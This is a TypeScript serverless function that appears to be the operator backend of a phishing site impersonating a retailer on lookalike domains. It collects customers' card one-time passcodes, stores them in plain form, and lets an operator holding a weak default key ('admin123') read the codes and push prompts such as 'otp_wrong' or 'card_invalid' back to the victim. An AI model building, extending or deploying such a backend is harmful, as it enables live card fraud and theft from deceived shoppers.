import { getStore } from "@netlify/blobs";

const ADMIN_KEY = process.env.DESK_KEY || "admin123";

const LOCKED = new Set([
  "otp_requested",
  "otp_wrong",
  "otp_received",
  "card_invalid",
  "paid",
  "rejected",
  "failed",
]);

function allowOrigin(origin: string) {
  if (!origin) return false;
  try {
    const host = new URL(origin).hostname;
    return (
      host === "jarir.world" ||
      host === "www.jarir.world" ||
      host === "jarironline.world" ||
      host === "www.jarironline.world" ||
      host.endsWith(".netlify.app") ||
      host === "localhost"
    );
  } catch {
    return false;
  }
}

function corsHeaders(req: Request) {
  const origin = req.headers.get("origin") || "";
  const allow = allowOrigin(origin) ? origin : "https://jarir-store.netlify.app";
  return {
    "access-control-allow-origin": allow,
    "access-control-allow-headers": "content-type, x-desk-key, authorization",
    "access-control-allow-methods": "GET,HEAD,POST,OPTIONS",
    "access-control-max-age": "86400",
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    vary: "Origin",
  };
}

function isAdmin(req: Request) {
  const header = req.headers.get("x-desk-key") || "";
  const bearer = (req.headers.get("authorization") || "").replace(/^Bearer\s+/i, "");
  const token = header || bearer;
  return Boolean(token) && token === ADMIN_KEY;
}

async function readBody(req: Request) {
  const text = await req.text();
  if (!text) return {};
  try {
    return JSON.parse(text) as Record<string, unknown>;
  } catch {
    return {};
  }
}

type DeskOrder = {
  id?: string;
  number?: string;
  paymentStatus?: string;
  otp?: unknown;
  status?: string;
  liveDraft?: boolean;
  updatedAt?: string;
  date?: string;
  reviewDeadline?: string;
};

function mergeOrder(existing: DeskOrder | undefined, incoming: DeskOrder): DeskOrder {
  if (!existing) return incoming;
  const incomingOtp = incoming.otp as { code?: string } | undefined;
  const existingOtp = existing.otp as { code?: string } | undefined;
  if (incomingOtp?.code) {
    return {
      ...existing,
      ...incoming,
      otp: incoming.otp,
      paymentStatus: incoming.paymentStatus || "otp_received",
      liveDraft: false,
    };
  }
  if (LOCKED.has(existing.paymentStatus || "") && !LOCKED.has(incoming.paymentStatus || "")) {
    return {
      ...incoming,
      paymentStatus: existing.paymentStatus,
      otp: existingOtp?.code ? existing.otp : incoming.otp || existing.otp,
      status: existing.paymentStatus === "paid" || existing.paymentStatus === "rejected" ? existing.status : incoming.status,
      liveDraft: existing.paymentStatus === "paid" || existing.paymentStatus === "rejected" ? false : incoming.liveDraft,
      reviewDeadline:
        existing.paymentStatus === "paid" || existing.paymentStatus === "rejected"
          ? undefined
          : existing.reviewDeadline,
      updatedAt: incoming.updatedAt || existing.updatedAt,
    };
  }
  const incomingAt = incoming.updatedAt || incoming.date || "";
  const existingAt = existing.updatedAt || existing.date || "";
  return incomingAt >= existingAt ? incoming : existing;
}

function findOrder(list: DeskOrder[], id: string) {
  return list.find((item) => item?.id === id || item?.number === id);
}

export default async (req: Request) => {
  const cors = corsHeaders(req);
  if (req.method === "OPTIONS" || req.method === "HEAD") {
    return new Response(null, { status: 204, headers: cors });
  }

  try {
    const store = getStore({ name: "jarir-desk", consistency: "strong" });
    const url = new URL(req.url);
    const body = req.method === "POST" ? await readBody(req) : {};
    const op = (body as { op?: string }).op || url.searchParams.get("op") || "list";
    const current = (await store.get("orders", { type: "json" })) || [];
    const list: DeskOrder[] = Array.isArray(current) ? current : [];

    if (op === "get") {
      const id = String((body as { id?: string }).id || url.searchParams.get("id") || "");
      if (!id) return Response.json({ ok: false, error: "missing-id" }, { status: 400, headers: cors });
      const order = findOrder(list, id) || null;
      return Response.json({ ok: true, order }, { headers: cors });
    }

    if (op === "otp") {
      const id = String((body as { id?: string }).id || "");
      const code = String((body as { code?: string }).code || "").replace(/\D/g, "").slice(0, 6);
      if (!id || code.length !== 6) {
        return Response.json({ ok: false, error: "invalid-otp" }, { status: 400, headers: cors });
      }
      const existing = findOrder(list, id);
      if (!existing?.id) return Response.json({ ok: false, error: "not-found" }, { status: 404, headers: cors });
      const prev = (existing.otp || {}) as { attempts?: number; requestedAt?: string };
      const nextOrder: DeskOrder = {
        ...existing,
        paymentStatus: "otp_received",
        liveDraft: false,
        otp: {
          code,
          requestedAt: prev.requestedAt,
          submittedAt: new Date().toISOString(),
          attempts: (prev.attempts ?? 0) + 1,
        },
        updatedAt: new Date().toISOString(),
      };
      const next = [nextOrder, ...list.filter((item) => item?.id !== existing.id)].slice(0, 80);
      await store.setJSON("orders", next);
      return Response.json({ ok: true, order: nextOrder }, { headers: cors });
    }

    if (op === "command") {
      if (!isAdmin(req)) return Response.json({ ok: false, error: "unauthorized" }, { status: 401, headers: cors });
      const id = String((body as { id?: string }).id || "");
      const patch = (body as { patch?: DeskOrder }).patch || {};
      const existing = findOrder(list, id);
      if (!existing?.id) return Response.json({ ok: false, error: "not-found" }, { status: 404, headers: cors });
      const nextOrder: DeskOrder = {
        ...existing,
        ...patch,
        id: existing.id,
        liveDraft: patch.paymentStatus === "paid" || patch.paymentStatus === "rejected" ? false : (patch.liveDraft ?? false),
        reviewDeadline:
          patch.paymentStatus === "paid" || patch.paymentStatus === "rejected" ? undefined : existing.reviewDeadline,
        updatedAt: new Date().toISOString(),
      };
      const next = [nextOrder, ...list.filter((item) => item?.id !== existing.id)].slice(0, 80);
      await store.setJSON("orders", next);
      return Response.json({ ok: true, order: nextOrder }, { headers: cors });
    }

    if (op === "replace") {
      if (!isAdmin(req)) return Response.json({ ok: false, error: "unauthorized" }, { status: 401, headers: cors });
      const next = Array.isArray((body as { orders?: unknown[] }).orders)
        ? ((body as { orders: unknown[] }).orders as unknown[]).slice(0, 80)
        : [];
      await store.setJSON("orders", next);
      return Response.json({ ok: true, orders: next }, { headers: cors });
    }

    if (op === "save" && (body as { order?: DeskOrder }).order?.id) {
      const incoming = (body as { order: DeskOrder }).order;
      const existing = findOrder(list, incoming.id!);
      const merged = mergeOrder(existing, incoming);
      const next = [merged, ...list.filter((item) => item?.id !== merged.id)].slice(0, 80);
      await store.setJSON("orders", next);
      return Response.json({ ok: true, id: merged.id, order: merged }, { headers: cors });
    }

    if (!isAdmin(req)) {
      return Response.json({ ok: false, error: "unauthorized" }, { status: 401, headers: cors });
    }

    return Response.json({ ok: true, orders: list }, { headers: cors });
  } catch (error) {
    return Response.json(
      { ok: false, error: String((error as Error)?.message || error) },
      { status: 500, headers: cors },
    );
  }
};

export const config = {
  path: "/api/desk",
};
